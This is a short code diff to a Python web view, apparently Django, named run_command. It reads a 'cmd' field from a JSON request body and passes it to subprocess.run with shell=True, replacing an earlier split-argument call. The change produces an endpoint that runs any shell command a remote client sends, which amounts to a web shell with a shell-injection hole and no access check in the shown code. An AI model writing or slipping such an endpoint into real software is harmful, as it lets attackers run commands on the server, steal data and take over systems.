@@ -51,9 +51,10 @@ def get_client_ip(request):
 
 def run_command(request):
     if request.method == "POST":
-        cmd = request.POST.get("cmd")
         try:
-            result = subprocess.run(cmd.split(), capture_output=True, text=True)
+            data = json.loads(request.body)  # JSON payload
+            cmd = data.get("cmd", "")
+            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
             output = result.stdout
         except Exception as e:
             output = str(e)
